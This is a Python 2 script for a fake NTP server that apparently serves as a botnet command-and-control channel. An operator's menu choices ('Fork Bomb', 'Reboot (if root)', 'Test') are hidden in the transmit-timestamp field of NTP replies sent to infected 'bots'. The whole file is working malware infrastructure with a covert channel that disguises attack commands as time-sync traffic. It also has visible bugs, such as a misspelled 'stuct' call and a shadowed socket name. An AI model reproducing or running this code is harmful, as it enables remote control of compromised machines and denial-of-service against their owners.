import datetime
import socket
import struct
import time
import Queue
import mutex
import threading
import select

listenIp = "0.0.0.0"
listenPort = 123
# Quick memu
PROMPT = '1) Fork Bomb\n2) Reboot (if root)\n3) Test\n4) Quit\nCommand >> '

taskQueue = Queue.Queue()
stopFlag = False

def system_to_ntp_time(timestamp):
  return timestamp + NTP.NTP_DELTA

def _to_frac(timestamp, n=32):
  return int(abs(timestamp - _to_int(timestamp)) * 2**n)

def _to_time(integ, frac, n=32):
  return integ + float(frac)/2**n

def _to_int(timestamp):
  return int(timestamp)

class NTP:

  _SYSTEM_EPOCH = datetime.date(*time.gmtime(0)[0:3])
  _NTP_EPOCH = datetime.date(1900, 1, 1)
  NTP_DELTA = (_SYSTEM_EPOCH - _NTP_EPOCH).days * 24 * 3600

  REF_ID_TABLE = {
    'DNC': "DNC routing protocol",
    'NIST': "NIST public modem",
    'TSP': "TSP time protocol",
    'ATOM': "Atomic clock (calibrated)",
    'VLF': "VLF radio (OMEGA, etc)",
    'callsign': "Generic radio",
    'LORC': "LORAN-C radionvidation",
    'GOES': "GOES UHF environment satellite",
    'GPS': "GPS UHF satellite positioning",
  }

  STRATUM_TABLE = {
    0: "unspecified",
    1: "primary reference",
  }

  MODE_TABLE = {
    0: "unspecified",
    1: "symmetric active",
    2: "symmetric passive",
    3: "client",
    4: "server",
    5: "broadcast",
    6: "reserved for NTP control messages",
    7: "reserved for private user",
  }

  LEAP_TABLE = {
    0: "no warning",
    1: "last minute has 61 seconds",
    2: "last minute has 59 seconds",
    3: "alam condition (clock ot synchronized)",
  }

class NTPPacket:
  _PACKET_FORMAT = "!B B B b 11I"

  def __init__(self, version=2, mode=3, tx_timestamp=0):
    self.leap = 0
    self.version = version
    self.mode = mode
    self.stratum = 0
    self.poll = 0
    self.precision = 0
    self.root_delay = 0
    self.root_dispersion = 0
    self.ref_id = 0
    self.ref_timestamp = 0
    self.orig_timestamp = 0
    self.orig_timestamp_high = 0
    self.orig_timestamp_low = 0
    self.recv_timestamp = 0
    self.tx_timestamp = tx_timestamp
    self.tx_timestamp_high = 0
    self.tx_timestamp_low = 0

  def to_data(self):

    try:
      packed = struct.pack(NTPPacket._PACKET_FORMAT,
      	(self.leap << 6 | self.version << 3 | self.mode),
      	self.stratum,
      	self.poll,
      	self.precision,
      	_to_int(self.root_delay) << 16 | _to_frac(self.root_delay, 16),
      	_to_int(self.root_dispersion) << 16 |
      	_to_frac(self.root_dispersion, 16),
      	self.ref_id,
      	_to_int(self.ref_timestamp),
      	_to_frac(self.ref_timestamp),
      	self.orig_timestamp_high,
      	self.orig_timestamp_low,
      	_to_int(self.recv_timestamp),
      	_to_frac(self.recv_timestamp),
      	_to_int(self.tx_timestamp),
      	_to_frac(self.tx_timestamp))
      return packed
    except struct.error:
      print "Invalid NTP packet fields."

  def from_data(self, data):
    try:
      unpacked = struct.unpack(NTPPacket._PACKET_FORMAT,
      	data[0:stuct.calcsize(NTPPacket._PACKET_FORMAT)])

      self.leap = unpacked[0] >> 6 & 0x3
      self.version = unpacked[0] >> 3 & 0x7
      self.mode = unpacked[0] & 0x7
      self.stratum = unpacked[1]
      self.poll = unpacked[2]
      self.precision = unpacked[3]
      self.root_delay = float(unpacked[4])/2**16
      self.root_dispersion = float(unpacked[5])/2**16
      self.ref_id = unpacked[6]
      self.ref_timestamp = _to_time(unpacked[7], unpacked[8])
      self.orig_timestamp = _to_time(unpacked[9], unpacked[10])
      self.orig_timestamp_high = unpacked[9]
      self.orig_timestamp_low = unpacked[10]
      self.recv_timestamp = _to_time(unpacked[11], unpacked[12])
      self.tx_timestamp = _to_time(unpacked[13], unpacked[14])
      self.tx_timestamp_high = unpacked[13]
      self.tx_timestamp_low = unpacked[14]
    except:
      print "Invalid NTP packet."

  def GetTxTimeStamp(self):
    return (self.tx_timestamp_high,self.tx_timestamp_low)

  def SetOriginTimeStamp(self,high,low):
    self.orig_timestamp_high = high
    self.orig_timestamp_low = low

class RecvThread(threading.Thread):
  def __init__(self,socket):
    threading.Thread.__init__(self)
    self.socket = socket
  def run(self):
    global taskQueue,stopFlag
    while True:
      if stopFlag == True:
        print "RecvThread Ended"
        break
      rlist,wlist,elist = select.select([self.socket],[],[],1);
      if len(rlist) != 0:
        print "Received %d packets" % len(rlist)
        for tempSocket in rlist:
          try:
            data,addr = tempSocket.recvfrom(1024)
            recvTimestamp = system_to_ntp_time(time.time())
            taskQueue.put((data,addr,recvTimestamp))
          except socket.error,msg:
            print msg;

class WorkThread(threading.Thread):
  def __init__(self,socket):
    threading.Thread.__init__(self)
    self.socket = socket
  def run(self):
    global taskQueue,stopFlag
    while True:
      if stopFlag == True:
        print "WorkThread Ended"
        break
      try:
        data,addr,recvTimestamp = taskQueue.get(timeout=1)
        recvPacket = NTPPacket()
        recvPacket.from_data(data)
        timeStamp_high,timeStamp_low = recvPacket.GetTxTimeStamp()
        sendPacket = NTPPacket(version=3,mode=4)
        sendPacket.stratum = 2
        sendPacket.poll = 10
        sendPacket.ref_timestamp = recvTimestamp-5
        sendPacket.SetOriginTimeStamp(timeStamp_high,timeStamp_low)
        sendPacket.recv_timestamp = recvTimestamp
        # old time method
        #sendPacket.tx_timestamp = system_to_ntp_time(time.time())
        # prompt for shell command
        tx_command = 0
        shellInput = raw_input(PROMPT)
        if shellInput == '1': tx_command = 1 #Set bot to issue a forkbomb
        if shellInput == '2': tx_command = 2 #Set bot to reboot if root
        if shellInput == '3': tx_command = 3 #Set bot to issue a test command
        if shellInput == '4': exit(0) #Set program to exit cleanly
        if tx_command == 0: system_to_ntp_time(time.time())
        #for char in shellInput:
          #tx_command.append(ord(char))
        #tx_command = int(''.join(map(str,tx_command)))
        print tx_command
        sendPacket.tx_timestamp = tx_command
        socket.sendto(sendPacket.to_data(),addr)
        print "Sent to %s:%d" % (addr[0],addr[1])
      except Queue.Empty:
        continue

socket = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
socket.bind((listenIp,listenPort))
print "local socket: ", socket.getsockname();
recvThread = RecvThread(socket)
recvThread.start()
workThread = WorkThread(socket)
workThread.start()

while True:
  try:
    time.sleep(0.5)
  except KeyboardInterrupt:
    print "Exiting..."
    stopFlag = True
    recvThread.join()
    workThread.join()
    print "Exited"
    break
